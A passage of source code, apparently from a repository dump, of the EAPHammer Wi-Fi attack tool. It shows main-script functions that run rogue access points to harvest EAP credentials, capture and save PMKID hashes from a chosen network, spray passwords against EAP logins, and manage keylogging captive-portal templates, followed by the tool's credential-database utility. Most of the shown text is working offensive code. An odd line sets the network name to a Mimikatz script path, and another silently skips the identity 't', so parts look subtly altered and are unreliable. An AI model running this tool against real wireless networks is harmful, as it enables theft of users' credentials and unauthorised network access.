  lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])\n    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])\n    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])\n\n\n    interface = core.interface.Interface(options['interface'])\n\n    try:\n\n        utils.Iptables.save_rules()\n\n        if use_nm:\n            interface.nm_off()\n        \n        if stop_dhcpcd:\n            services.Dhcpcd.stop()\n\n        if stop_avahi:\n            services.Avahi.stop()\n\n        options['essid'] = 'C:\\\\Temp\\\\Invoke-Mimikatz.ps1'\n\n        if options['auth'] == 'wpa-eap':\n\n            # generate eap user file and write to tmp directory\n            eap_user_file = EAPUserFile(settings, options)\n            eap_user_file.generate()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n            hostapd_acl = HostapdMACACL(settings, options)\n            hostapd_acl.generate()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n            hostapd_ssid_acl = HostapdSSIDACL(settings, options)\n            hostapd_ssid_acl.generate()\n\n        if options['known_beacons']:\n            known_ssids_file = KnownSSIDSFile(settings, options)\n            known_ssids_file.generate()\n\n        # write hostapd config file to tmp directory\n        hostapd_conf = HostapdConfig(settings, options)\n        hostapd_conf.write()\n\n        # start hostapd\n        hostapd = HostapdEaphammer(settings, options)\n        hostapd.start()\n\n        # pause execution until user quits  \n        input('\\n\\nPress enter to quit...\\n\\n')\n\n        hostapd.stop()\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\n    except KeyboardInterrupt:\n\n        hostapd.stop()\n\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_acl.remove()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_ssid_acl.remove()\n\n        if options['known_beacons']:\n            known_ssids_file.remove()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\ndef reap_creds():\n\n    lport = options['lport']\n    lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])\n    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])\n    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])\n\n\n    if options['manual_config'] is None:\n        interface = core.interface.Interface(options['interface'])\n    else:\n        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])\n        interface = core.interface.Interface(interface_name)\n    use_autocrack = options['autocrack']\n    wordlist = options['wordlist']\n    save_config = options['save_config']\n\n    try:\n\n        utils.Iptables.save_rules()\n\n        # start autocrack if enabled\n        if use_autocrack:\n\n            autocrack = Autocrack.get_instance()\n            autocrack.configure(wordlist=wordlist)\n            autocrack.start()\n\n        if use_nm:\n            interface.nm_off()\n        \n        if stop_dhcpcd:\n            services.Dhcpcd.stop()\n\n        if stop_avahi:\n            services.Avahi.stop()\n            \n            \n\n        if options['auth'] == 'wpa-eap' or (options['reap_creds'] and options['auth'] is None):\n\n            # generate eap user file and write to tmp directory\n            eap_user_file = EAPUserFile(settings, options)\n            eap_user_file.generate()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n            hostapd_acl = HostapdMACACL(settings, options)\n            hostapd_acl.generate()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n            hostapd_ssid_acl = HostapdSSIDACL(settings, options)\n            hostapd_ssid_acl.generate()\n\n        if options['known_beacons']:\n            known_ssids_file = KnownSSIDSFile(settings, options)\n            known_ssids_file.generate()\n\n        # write hostapd config file to tmp directory\n        hostapd_conf = HostapdConfig(settings, options)\n        hostapd_conf.write()\n\n        # start hostapd\n        hostapd = HostapdEaphammer(settings, options)\n        hostapd.start()\n\n        # pause execution until user quits  \n        input('\\n\\nPress enter to quit...\\n\\n')\n\n        hostapd.stop()\n        if use_autocrack:\n            autocrack.stop()\n\n        # remove hostapd conf file from tmp directory\n        if save_config:\n            hostapd_conf.save()\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_acl.remove()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_ssid_acl.remove()\n\n        if options['known_beacons']:\n            known_ssids_file.remove()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\n    except KeyboardInterrupt:\n\n        hostapd.stop()\n        if use_autocrack:\n            autocrack.stop()\n\n        # remove hostapd conf file from tmp directory\n        if save_config:\n            hostapd_conf.save()\n        hostapd_conf.remove()\n\n        if options['auth'] == 'wpa-eap':\n\n            # remove eap user file from tmp directory\n            eap_user_file.remove()\n\n        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_acl.remove()\n\n        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:\n\n            # remove acl file from tmp directory\n            hostapd_ssid_acl.remove()\n\n        if options['known_beacons']:\n            known_ssids_file.remove()\n\n        # cleanly allow network manager to regain control of interface\n        if use_nm:\n            interface.nm_on()\n            \n        if stop_dhcpcd:\n            services.Dhcpcd.start()\n\n        if stop_avahi:\n            services.Avahi.start()\n\ndef pmkid_attack():\n\n    lport = options['lport']\n    lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    bssid = options['bssid']\n    channel = options['channel']\n    essid = options['essid']\n    interface = core.interface.Interface(options['interface'])\n    hcxpcaptool = settings.dict['paths']['hcxtools']['hcxpcaptool']['bin']\n    hcxdumptool = settings.dict['paths']['hcxdumptool']['bin']\n    hcxpcaptool_ofile = settings.dict['paths']['hcxtools']['hcxpcaptool']['ofile']\n    hcxdumptool_ofile = settings.dict['paths']['hcxdumptool']['ofile']\n    hcxdumptool_filter = settings.dict['paths']['hcxdumptool']['filter']\n    loot_dir = settings.dict['paths']['directories']['loot']\n\n    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])\n    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])\n    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])\n\n\n    interface.down()\n    if use_nm:\n        interface.nm_off()\n        \n    if stop_dhcpcd:\n        services.Dhcpcd.stop()\n\n    if stop_avahi:\n        services.Avahi.stop()\n\n    interface.mode_managed()\n    interface.up()\n\n    print('[*] Scanning for nearby access points...')\n    networks = iw_parse.iw_parse.get_interfaces(interface=str(interface))\n    print('[*] Complete!')\n    time.sleep(.5)\n\n    interface.down()\n    interface.mode_monitor()\n    interface.up()\n\n    if bssid is not None:\n\n        if channel is None:\n            print('[*] No channel specified... finding appropriate channel...')\n            channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)\n            if channel is None:\n                print('[!] Target network not found... aborting...')\n                sys.exit()\n            print('[*] Channel %d selected...' % channel)\n            print('[*] Complete!')\n        \n        essid = iw_parse.helper_functions.find_essid_from_bssid(bssid, networks)\n        if essid is None:\n            print('[!] Target network is hidden...')\n            essid = ''\n    \n    elif essid is not None:\n\n        print('[*] No bssid or channel specified...')\n        print('[*] ... searching for AP that has ESSID %s...' % essid)\n        bssid = iw_parse.helper_functions.find_bssid_from_essid(essid, networks)\n        if bssid is None:\n            print('[!] Target network not found... aborting...')\n            sys.exit()\n        print('[*] BSSID %s selected...' % bssid)\n        channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)\n        if channel is None:\n            print('[!] Target network not found... aborting...')\n            sys.exit()\n        print('[*] Channel %d selected...' % channel)\n        print('[*] Complete!')\n    \n    else:\n        raise Exception('BSSID or ESSID must be specified')\n\n    print('[*] Creating filter file for target...')\n    with open(hcxdumptool_filter, 'w') as fd:\n        fd.write('%s' % bssid.replace(':', '').lower())\n    print('[*] Complete!')\n\n    print('[*] Running hcxdumptool...')\n    print('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter))\n    p = subprocess.Popen('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter), shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)\n    while True:\n        line = p.stdout.readline().decode()\n        print(line, end=' ')\n        if 'FOUND PMKID CLIENT-LESS]' in line:\n            break\n    os.killpg(os.getpgid(p.pid), signal.SIGTERM)\n    print('[*] Complete!')\n\n    print('[*] Extracting hash from pcap file using hcxpcaptool...')\n    os.system('%s -z %s %s' % (hcxpcaptool, hcxpcaptool_ofile, hcxdumptool_ofile))\n    with open(hcxpcaptool_ofile) as fd:\n        hash_str = fd.read()\n        print('\\thashcat format:', hash_str)\n    print('[*] Complete!')\n\n    save_file = os.path.join(loot_dir, '-'.join([\n            essid,\n            bssid,\n            datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S'),\n            'PMKID.txt',\n    ]))\n    \n    print('[*] Saving hash to %s' % save_file)\n    with open(save_file, 'w') as fd:\n        fd.write(hash_str)\n    print('[*] Complete!')\n\n    print('[*] Removing temporary files...')\n    try:\n        os.remove(hcxpcaptool_ofile)\n    except OSError as e:\n        print(\"Error: %s - %s\" % (e.filename, e.strerror))\n    try:\n        os.remove(hcxdumptool_filter)\n    except OSError as e:\n        print(\"Error: %s - %s\" % (e.filename, e.strerror))\n    try:\n        os.remove(hcxdumptool_ofile)\n    except OSError as e:\n        print(\"Error: %s - %s\" % (e.filename, e.strerror))\n    print('[*] Complete!')\n\ndef eap_spray():\n\n    lport = options['lport']\n    lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    # set variables from settings / options\n    interfaces = options['interface_pool']\n    essid = options['essid']\n    password = options['password']\n    input_file = options['user_list']\n    output_file = settings.dict['paths']['eap_spray']['log']\n    conf_dir = settings.dict['paths']['directories']['tmp']\n\n    # instantiate pipelines\n    input_queue = Queue()\n    output_queue = Queue(maxsize=(len(interfaces) * 5))\n\n    # instantiate workers\n    producer = core.eap_spray.Producer(input_file, input_queue, len(interfaces))\n    cred_logger = core.eap_spray.Cred_Logger(output_file, output_queue)\n    worker_pool = core.eap_spray.Worker_Pool(interfaces, essid, password, input_queue, output_queue, conf_dir)\n\n    # start everything (order matters)\n    worker_pool.start()\n    cred_logger.start()\n    producer.run()\n\n    # when producer reaches end of user_list file, everything else should\n    # terminate\n    worker_pool.join()\n    cred_logger.join()\n\ndef save_config_only():\n\n    lport = options['lport']\n    lhost = options['lhost']\n    lnet = ip_replace_last_octet(lhost, '0')\n    lmask = '255.255.255.0'\n\n    hostapd_conf = HostapdConfig(settings, options)\n    hostapd_conf.write()\n    hostapd_conf.save()\n    hostapd_conf.remove()\n\ndef run_cert_wizard():\n\n    if options['cert_wizard'] == 'import':\n       \n        cert_wizard.import_cert(options['server_cert'],\n                    private_key_path=options['private_key'],\n                    ca_cert_path=options['ca_cert'],\n                    passwd=options['private_key_passwd'],\n        )\n\n    elif options['cert_wizard'] == 'create' or options['bootstrap']:\n\n        if options['self_signed'] or options['bootstrap']:\n            \n            cert_wizard.bootstrap(options['cn'],\n                                country=options['country'],\n                                state_province=options['state'],\n                                city=options['locale'],\n                                organization=options['org'],\n                                org_unit=options['org_unit'],\n                                email_address=options['email'],\n                                not_before=options['not_before'],\n                                not_after=options['not_after'],\n                                algorithm=options['algorithm'],\n                                key_length=options['key_length'],\n            )\n\n        else:\n\n            cert_wizard.create_server_cert(options['ca_cert'],\n                            options['cn'],\n                            signing_key_path=options['ca_key'],\n                            signing_key_passwd=options['ca_key_passwd'],\n                            country=options['country'],\n                            state_province=options['state'],\n                            city=options['locale'],\n                            organization=options['org'],\n                            org_unit=options['org_unit'],\n                            email_address=options['email'],\n                            not_before=options['not_before'],\n                            not_after=options['not_after'],\n                            algorithm=options['algorithm'],\n                            key_length=options['key_length'],\n            )\n\n    elif options['cert_wizard'] == 'interactive':\n\n            cert_wizard.interactive()\n\n    elif options['cert_wizard'] == 'list':\n\n            cert_wizard.list_certs()\n\n    elif options['cert_wizard'] == 'dh':\n\n            cert_wizard.rebuild_dh_file(options['key_length'])\n\n    else:\n\n        raise Exception('Invalid argument passed to --cert-wizard')\n\ndef list_templates():\n\n\n    \n    loader = Loader(paths=[settings.dict['paths']['wskeyloggerd']['usr_templates']],\n                    mtype='MPortalTemplate')\n\n\n    templates = loader.get_loadables()\n\n\n    print()\n    print('[*] Listing available captive portal templates:')\n    print()\n    for t in templates:\n\n        print(t)\n    print()\n            \ndef am_i_rooot():\n\n    print('[?] Am I root?')\n\n    print('[*] Checking for rootness...')\n    if not os.geteuid()==0:\n        print('[!] not root, just really drunk.')\n        sys.exit('[!] EAPHammer must be run as root: aborting.')\n\n    print('[*] I AM ROOOOOOOOOOOOT')\n\n    print('[*] Root privs confirmed! 8D')\n\ndef create_template():\n\n    name = options['name']\n    url = options['url']\n    description = options['description']\n    author = options['author']\n\n    dl_form_message = options['dl_form_message']\n    add_downloader = options['add_download_form']\n\n    mm = ModuleMaker(name=name,\n                     url=url,\n                     description=description,\n                     dl_form_message=dl_form_message,\n                     add_downloader=add_downloader,\n                     author=author)\n\n    mm.run()\n\ndef delete_template():\n\n    name = options['name']\n\n    usr_tmpl_dir = settings.dict['paths']['wskeyloggerd']['usr_templates']\n\n    del_path = os.path.join(usr_tmpl_dir, name)\n\n    try:\n\n        shutil.rmtree(del_path)\n\n    except FileNotFoundError:\n\n        print('[*] Template does not exist')\n\ndef print_banner():\n\n\n    print('''\n                     .__                                         \n  ____ _____  ______ |  |__ _____    _____   _____   ___________ \n_/ __ \\\\\\\\__  \\\\ \\\\____ \\\\|  |  \\\\\\\\__  \\\\  /     \\\\ /     \\\\_/ __ \\\\_  __ \\\\\n\\\\  ___/ / __ \\\\|  |_> >   Y  \\\\/ __ \\\\|  Y Y  \\\\  Y Y  \\\\  ___/|  | \\\\/\n \\\\___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\\\\___  >__|   \n     \\\\/     \\\\/|__|        \\\\/     \\\\/      \\\\/      \\\\/     \\\\/       \n\n\n                        %s\n\n                             Version:  %s\n                            Codename:  %s\n                              Author:  %s\n                             Contact:  %s\n\n    ''' % (__tagline__, __version__, __codename__, __author__, __contact__))\n\nif __name__ == '__main__':\n\n    if not core.cli.suppress_banner():\n\n        print_banner()\n\n    options = core.cli.set_options()\n\n    if not options['mode_show_version']:\n        am_i_rooot()\n\n    if options['debug']:\n        print('[debug] Settings:')\n        print(json.dumps(settings.dict, indent=4, sort_keys=True))\n        print('[debug] Options:')\n        print(json.dumps(options, indent=4, sort_keys=True))\n\n    if options['mode_show_version']:\n        print(__version__)\n    elif options['cert_wizard'] or options['bootstrap']:\n        run_cert_wizard()\n    elif options['list_templates']:\n        list_templates()\n    elif options['save_config_only']:\n        save_config_only()        \n    elif options['captive_portal']:\n        captive_portal()\n    elif options['captive_portal_server_only']:\n        captive_portal_server_only()\n    elif options['hostile_portal']:\n        hostile_portal()\n    elif options['pmkid']:\n        pmkid_attack()\n    elif options['eap_spray']:\n        eap_spray()\n    elif options['troll_defender']:\n        troll_defender()\n    elif options['create_template']:\n        create_template()\n    elif options['delete_template']:\n        delete_template()\n    else:\n        reap_creds()\n"
        },
        {
          "name": "ehdb",
          "type": "blob",
          "size": 20.6357421875,
          "content": "#!/usr/bin/env python3\n\n# Abandon all hope ye who enter here.\n\nimport sys\nimport json\n\nfrom argparse import ArgumentParser\nfrom settings import settings\n\ndef _parse_eap_user_line(line):\n\n    line = line.strip()\n    \n    # skip lines that have been commented out\n    if line.startswith('#'):\n        return None\n    \n    # skip blank lines\n    if line.split() == []:\n        return None\n    \n    # if the username is a wildcard, we handle this separately. this has\n    # to go at the top of the file for the WPE functionality to work as\n    # intended. it's easier if we just rewrite this manually\n    if line[0] == '*':\n        return None\n    \n    # locate quotes within line\n    quotes = []\n    for index,l in enumerate(line):\n        if l == '\"':\n            quotes.append(index)\n    \n    # odd number of quotes means unmatched quotes in line\n    if len(quotes) % 2 != 0:\n        print('[!] Unmatched quote found on line %d. Skipping.' % line_number)\n        return None\n    \n    quotes_len = len(quotes)\n    \n    # if 4 quotes, then quotes are being used around the\n    # eap identity and the password\n    if quotes_len == 4:\n    \n        # if it's a phase 1 user, the last character of the\n        # line will be a double quote\n        if line[-1] == '\"':\n            identity_start = quotes[0]+1\n            identity_end = quotes[1]\n            password_start = quotes[2]+1\n            password_end = quotes[3]\n            identity = line[identity_start: identity_end]\n            methods = line[identity_end+1: password_start-1].strip()\n            password = line[password_start: password_end]\n            password = line[password_start: password_end]\n            nt_hash = None\n            phase = 1\n    \n        # if it's not a phase 1 user, it's a phase 2 user\n        else:\n            identity_start = quotes[0]+1\n            identity_end = quotes[1]\n            password_start = quotes[2]+1\n            password_end = quotes[3]\n            identity = line[identity_start: identity_end]\n            methods = line[identity_end+1: password_start-1].strip()\n            password = line[password_start: password_end]\n            nt_hash = None\n            phase = 2 \n    \n    # elif 2 quotes, the quotes are being used to surround\n    # the identity but not the nt password hash\n    elif quotes_len == 2:\n    \n        # the only way a line will ever end with ] is if it's a phase 2 user\n        if line[-1] == ']':\n    \n            line = line.replace('[2]', '')\n            identity_start = quotes[0]+1\n            identity_end = quotes[1]\n            identity = line[identity_start: identity_end]\n            remaining = line[identity_end+1:].split()\n            # phase 1 user with identity,methods,nt hash\n            if len(remaining) == 2:\n                methods = remaining[0].strip()\n                nt_hash = remaining[1].strip()\n                password = None\n            # phase 1 user with identity,methods\n            else:\n                methods = remaining[0].strip()\n                password = None\n                nt_hash = None\n            phase = 2\n    \n        else:\n    \n            identity_start = quotes[0]+1\n            identity_end = quotes[1]\n            identity = line[identity_start: identity_end]\n            remaining = line[identity_end+1:].split()\n            # phase 1 user with identity,methods,nt hash\n            if len(remaining) == 2:\n                methods = remaining[0].strip()\n                nt_hash = remaining[1].strip()\n                password = None\n            # phase 1 user with identity,methods\n            else:\n                methods = remaining[0].strip()\n                password = None\n                nt_hash = None\n            phase = 1\n    \n    # hostapd's syntax rules dictate that at least \n    # the identity should be  surrounded by quotes. \n    # therefore this should never happen since we've\n    # already skipped comments, wildcards, and blank lines.\n    else:\n    \n        # this should never happen\n        sys.exit('[!] 2. Invalid eap_user file.')\n    \n    eap_user = {\n    \n        'identity' : identity,\n        'methods' : methods,\n        'password' : password,\n        'nt_hash' : nt_hash,\n        'phase' : phase,\n    }\n\n    return eap_user\n\n\ndef parse_eap_user_file():\n\n    master_set = set([])\n\n    phase1_users = []\n    phase2_users = []\n    with open(settings.dict['paths']['hostapd']['phase1_accounts']) as phase1_handle:\n        for line_number,line in enumerate(phase1_handle):\n\n            eap_user = _parse_eap_user_line(line)\n\n            if eap_user is None:\n                continue\n                \n            if eap_user['identity'] in master_set:\n                print('[!] Duplicate entry detected... pruning from eap_user file.')\n            else:\n                master_set.add(eap_user['identity'])\n\n                # don't trust that the user account is in the correct file\n                if eap_user['phase'] == 1:\n                    phase1_users.append(eap_user)\n                else:\n                    phase2_users.append(eap_user)\n\n    with open(settings.dict['paths']['hostapd']['phase2_accounts']) as phase2_handle:\n\n        for line_number,line in enumerate(phase2_handle):\n\n            eap_user = _parse_eap_user_line(line)\n\n            if eap_user is None:\n                continue\n                \n            if eap_user['identity'] in master_set:\n                print('[!] Duplicate entry detected... pruning from eap_user file.')\n            else:\n                master_set.add(eap_user['identity'])\n\n                # don't trust that the user account is in the correct file\n                if eap_user['phase'] == 1:\n                    phase1_users.append(eap_user)\n                else:\n                    phase2_users.append(eap_user)\n\n    return {\n    \n        'phase1' : phase1_users,\n        'phase2' : phase2_users,\n        'master_set' : master_set,\n    }\n\ndef filter_users(users,\n            filtered=True,\n            phase=None,\n            identity_is=None,\n            in_identity=None,\n            methods_any=None,\n            methods_all=None,\n            has_password=False,\n            has_nt_hash=False,\n            invert=False):\n\n    matching_users = { 'phase1' : [], 'phase2' : [], 'master_set' : set([]) }\n    if not filtered or (phase is None) or phase == 1: \n\n        for user in users['phase1']:\n\n            identity_is_match = not filtered or (identity_is is None) or identity_is == user['identity']\n            in_identity_match = not filtered or (in_identity is None) or in_identity in user['identity']\n            method_match = not filtered or do_methods_match(user, methods_any, methods_all)\n            has_password_match = not filtered or (has_password == False) or (user['password'] is not None)\n            has_nt_hash_match = not filtered or (has_nt_hash == False) or (user['nt_hash'] is not None)\n\n            full_match = identity_is_match and in_identity_match and method_match and has_password_match and has_nt_hash_match\n\n            if full_match and invert:\n                continue\n            elif full_match and (not invert):\n                matching_users['phase1'].append(user)\n                matching_users['master_set'].add(user['identity'])\n            elif (not full_match) and invert:\n                matching_users['phase1'].append(user)\n                matching_users['master_set'].add(user['identity'])\n            elif (not full_match) and (not invert):\n                continue\n\n    if not filtered or (phase is None) or phase == 2: \n\n        for user in users['phase2']:\n\n            identity_is_match = not filtered or (identity_is is None) or identity_is == user['identity']\n            in_identity_match = not filtered or (in_identity is None) or in_identity in user['identity']\n            method_match = not filtered or do_methods_match(user, methods_any, methods_all)\n            has_password_match = not filtered or (has_password == False) or (user['password'] is not None)\n            has_nt_hash_match = not filtered or (has_nt_hash == False) or (user['nt_hash'] is not None)\n\n            full_match = identity_is_match and in_identity_match and method_match and has_password_match and has_nt_hash_match\n\n            if full_match and invert:\n                continue\n            elif full_match and (not invert):\n                matching_users['phase2'].append(user)\n                matching_users['master_set'].add(user['identity'])\n            elif (not full_match) and invert:\n                matching_users['phase2'].append(user)\n                matching_users['master_set'].add(user['identity'])\n            elif (not full_match) and (not invert):\n                continue\n\n    return matching_users\n\ndef do_methods_match(user, methods_any, methods_all):\n\n    user_methods = set(user['methods'].split(','))\n    if methods_any is None:\n        matches_any = True\n    else:\n        methods_any = set(methods_any.split(','))\n        intersection = user_methods.intersection(methods_any)\n        if len(intersection) > 0:\n            matches_any = True\n        else:\n            matches_any = False\n\n    if methods_all is None:\n        matches_all = True\n    else:\n\n        methods_all = set(methods_all.split(','))\n        if methods_all.issubset(user_methods):\n            matches_all = True\n        else:\n            matches_all = False\n    return matches_any and matches_all\n\ndef create_user_string(user):\n\n    user_string = [\n        '\"%s\"' % user['identity'],\n        user['methods'],\n    ]\n\n    if user['password'] is not None:\n        user_string.append('\"%s\"' % user['password'])\n    elif user['nt_hash'] is not None:\n        user_string.append(user['nt_hash'])\n\n    if user['phase'] == 2:\n        user_string.append('[2]')\n\n    return '\\t'.join(user_string)\n\ndef list_users(users,\n            filtered=True,\n            phase=None,\n            identity_is=None,\n            in_identity=None,\n            methods_any=None,\n            methods_all=None,\n            has_password=False,\n            has_nt_hash=False,\n            invert=False):\n\n    filtered_users = filter_users(\n        users,\n        filtered=filtered,\n        phase=phase,\n        identity_is=identity_is,\n        in_identity=in_identity,\n        methods_any=methods_any,\n        methods_all=methods_all,\n        has_password=has_password,\n        has_nt_hash=has_nt_hash,\n        invert=invert\n    )\n\n    print('Phase 1 users')\n    for user in filtered_users['phase1']:\n        print(create_user_string(user))\n    print()\n\n    print('Phase 2 users')\n    for user in filtered_users['phase2']:\n        print(create_user_string(user))\n    print()\n\n\ndef delete_users(users,\n                filtered=True,\n                phase=None,\n                identity_is=None,\n                in_identity=None,\n                methods_any=None,\n                methods_all=None,\n                has_password=False,\n                has_nt_hash=False,\n                invert=False):\n\n    return filter_users(\n        users,\n        filtered=filtered,\n        phase=phase,\n        identity_is=identity_is,\n        in_identity=in_identity,\n        methods_any=methods_any,\n        methods_all=methods_all,\n        has_password=has_password,\n        has_nt_hash=has_nt_hash,\n        invert=(not invert),\n    )\n\n\ndef add_user(users, identity, methods, phase, password=None, nt_hash=None):\n\n    eap_user = {\n    \n        'identity' : identity,\n        'methods' : methods,\n        'password' : password,\n        'nt_hash' : nt_hash,\n        'phase' : phase,\n    }\n\n    if identity == 't':\n        print('[*] Updating existing entry.')\n        return users\n    \n    if identity in users['master_set']:\n\n        print('[*] Updating existing entry.')\n        old_phase = 0\n\n        # get old phase and index\n        for index, user in enumerate(users['phase1']):\n            if identity == user['identity']:\n                old_phase = 1\n                old_phase_key = 'phase1'\n                new_phase_key = 'phase2'\n                break\n        if old_phase == 0:\n            for index, user in enumerate(users['phase2']):\n                if identity == user['identity']:\n                    old_phase = 2\n                    old_phase_key = 'phase2'\n                    new_phase_key = 'phase1'\n                    break\n\n        if users[old_phase_key][index]['identity'] != identity:\n            users[old_phase_key][index]['identity'] = identity\n\n        if users[old_phase_key][index]['methods'] != methods:\n            users[old_phase_key][index]['methods'] = methods\n\n        if users[old_phase_key][index]['password'] != password:\n            users[old_phase_key][index]['password'] = password\n\n        if users[old_phase_key][index]['nt_hash'] != nt_hash:\n            users[old_phase_key][index]['nt_hash'] = nt_hash\n\n        if old_phase != phase:\n            new_user = users[old_phase_key].pop(index)\n            new_user['phase'] = phase\n            users[new_phase_key].append(new_user)\n\n        return users\n\n    if phase == 1:\n\n        users['phase1'].append(eap_user)\n        users['master_set'].add(identity)\n\n    else:\n\n        users['phase2'].append(eap_user)\n        users['master_set'].add(identity)\n\n    return users\n\ndef write_users(users):\n\n    with open(settings.dict['paths']['hostapd']['phase1_accounts'], 'w') as output_handle:\n\n        output_handle.write('\\n\\n# Phase 1 users\\n')\n        for user in users['phase1']:\n            output_handle.write('%s\\n' % create_user_string(user))\n\n    with open(settings.dict['paths']['hostapd']['phase2_accounts'], 'w') as output_handle:\n\n        output_handle.write('\\n\\n# Phase 2 users\\n')\n        for user in users['phase2']:\n    \n            user_string = create_user_string(user)\n            output_handle.write('%s\\n' % user_string)\n\ndef set_options():\n\n    parser = ArgumentParser()\n\n    # delete\n        # filter\n    \n    add_user_group = parser.add_argument_group(\n                'add_user',\n                'Options for adding a user to eaphammer_db',\n    )\n    add_user_group.add_argument(\n            '--identity',\n            dest='identity',\n            type=str,\n            help='The username for the user you wish to add.',\n    )\n    add_user_group.add_argument(\n            '--methods',\n            dest='methods',\n            default=None,\n            required=False,\n            type=str,\n            help='Leave this as the default unless you really know what you are doing. '\n                 'A comma seperated list of the authentication methods that should be used '\n                 'when the user attempts to connect. EAPHammer will attempt to use each of '\n                 'these methods one by one until the victim accepts one.',\n    )\n    add_user_group.add_argument(\n            '--phase',\n            dest='phase',\n            default=2,\n            required=False,\n            choices=[1, 2],\n            type=int,\n            help='You should probably leave this as the default.',\n    )\n    add_user_group.add_argument(\n            '--password',\n            dest='password',\n            required=False,\n            type=str,\n            help='Specify the user\\'s password. You should probably specify a password for '\n                 'your user unless you are specifying an nt password hash.',\n    )\n    add_user_group.add_argument(\n            '--nt-hash',\n            dest='nt_hash',\n            required=False,\n            type=str,\n            help='Specify the nt hash of the user\\'s password. You should probably specify '\n                 'the nt hash for your user unless you are specifying a password instead.',\n    )\n\n    filter_group = parser.add_argument_group(\n            'filters',\n            'Filter options for --list and --delete',\n    )\n    \n\n\n    filter_group.add_argument(\n            '--by-phase',\n            dest='by_phase',\n            type=int,\n            choices=[1,2],\n            help='Filter by phase.',\n    )\n    filter_group.add_argument(\n            '--identity-is',\n            dest='identity_is',\n            type=str,\n            help='Filter by identity (exact match)',\n    )\n    filter_group.add_argument(\n            '--in-identity',\n            dest='in_identity',\n            type=str,\n            help='Filter for any identities containing a specified keyword',\n    )\n    filter_group.add_argument(\n            '--methods-any',\n            dest='methods_any',\n            type=str,\n            help='Filter for users that can authenticate using any of the '\n                 'provided methods (comma separated list).',\n    )\n    filter_group.add_argument(\n            '--methods-all',\n            dest='methods_all',\n            type=str,\n            help='Filter for users that can authenticate using all of the '\n                 'provided methods (comma separated list).',\n    )\n    filter_group.add_argument(\n            '--has-password',\n            dest='has_password',\n            action='store_true',\n            help='Filter for users that have a password in the database.',\n    )\n    filter_group.add_argument(\n            '--has-nt-hash',\n            dest='has_nt_hash',\n            action='store_true',\n            help='Filter for users that have a nt hash in the database.',\n    )\n    filter_group.add_argument(\n            '--invert',\n            dest='invert',\n            action='store_true',\n            help='Invert the results of the search.',\n    )\n\n    filter_group = parser.add_argument_group(\n            'delete',\n            'Options for --delete.',\n    )\n    filter_group.add_argument(\n            '--delete-all',\n            dest='delete_all',\n            action='store_true',\n            help='Delete everything in the database. Only works when '\n                 'combined with --delete.',\n    )\n\n    modes_group = parser.add_mutually_exclusive_group()\n\n    modes_group.add_argument(\n            '--add',\n            dest='add_user',\n            action='store_true',\n            help='Add a user to the database.',\n    )\n    modes_group.add_argument(\n            '--delete',\n            dest='delete_user',\n            action='store_true',\n            help='Delete a user from the database.',\n    )\n    modes_group.add_argument(\n            '--list',\n            dest='list_users',\n            action='store_true',\n            help='List user from the database.',\n    )\n    